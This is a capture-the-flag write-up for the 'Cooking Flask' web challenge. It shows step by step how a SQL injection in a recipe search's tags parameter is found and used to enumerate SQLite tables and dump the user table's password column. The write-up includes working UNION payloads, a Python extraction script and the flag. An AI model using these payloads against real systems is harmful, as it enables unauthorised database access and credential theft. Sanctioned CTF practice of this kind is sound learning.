---
ai_date: 2025-05-17 21:38:59
ai_summary: Exploited SQL injection vulnerability to extract 'password' column from 'user' table, retrieving flag
ai_tags:
  - sql
  - union
  - select
created: 2025-05-17T05:17
points: 359
solves: 141
title: Cooking Flask
updated: 2025-05-17T22:01
---

This is clearly a SQL challenge.

However name and description are not vulnerable.

So I tried tags, which is indeed vulnerable.

```python
params = {
    "recipe_name": "",
    "description": "",
    "tags": [
        "%' OR 1=1)--
    ]
}
```

We can assume that the server is doing do something like this:

```sql
SELECT * FROM recipe
WHERE recipe_name LIKE '%' || ? || '%'
AND recipe_description LIKE '%' || ? || '%'
AND ( tags LIKE '%Dessert%' OR tags LIKE '%Lunch%');
```

Those column names are guessed via selecting different columns and seeing if the error message changes.

```python
"%' OR (select recipe_id, recipe_name, recipe_description, tags from recipe))-- "
```

And the server is running `sqlite` (by guess and check https://yun.ng/c/sql).

```python
"%') UNION SELECT sqlite_version() -- "
```

```python
"%') UNION SELECT '0','1','2','3','4','5','6','7' FROM sqlite_master WHERE type='table' -- "
```

After a lot of pain, I found the number of columns in the table.

```
pydantic_core._pydantic_core.ValidationError: 2 validation errors for Recipe
date_created
  Datetimes provided to dates should have zero time - e.g. be exact dates [type=date_from_datetime_inexact, input_value='2', input_type=str]
    For further information visit https://errors.pydantic.dev/2.11/v/date_from_datetime_inexact
tags
  Input should be a valid list [type=list_type, input_value=6, input_type=int]
    For further information visit https://errors.pydantic.dev/2.11/v/list_type
```

Luckily the server gives me this very helpful error message.

After fixing the formats I am able to get my query back!

```python
"%') UNION SELECT '0','1','2025-05-17','3','4','5','[]','7' FROM sqlite_master WHERE type='table' -- "
```

## what table? what column?
So where is the flag? What is the table name?

```python
"%') UNION SELECT '0','1','2025-05-17','3',name,'5','[]','7' FROM sqlite_master WHERE type='table' -- "
```

```
login_attempt
login_session
personal_cookbook_entry
recipe
sqlite_sequence
to_try_entry
user
```

I guess it is in user?

```python
"%') UNION SELECT '0','1','2025-05-17','3',name,'5','[]','7' FROM pragma_table_info('user') -- "
```

```
date_joined
first_name
last_name
password
user_email
user_id
username
```

And there it is, `password`

```python
import requests
import re
params = {
    "recipe_name": "",
    "description": "",
    "tags": [
        # "%' OR 1=1)--"
        "%') UNION SELECT '0','1','2025-05-17','3',password,'5','[]','7' FROM user -- "
    ]
}
r = requests.get("https://cooking.chal.cyberjousting.com/search", params=params)
r = r.text

pattern = re.compile(r"<td>(.+)</td>")
for match in pattern.findall(r):
    print(match)

if not pattern.findall(r):
    print(r)
```

```flag
byuctf{pl34s3_p4r4m3t3r1z3_y0ur_1nputs_4nd_h4sh_p4ssw0rds}
```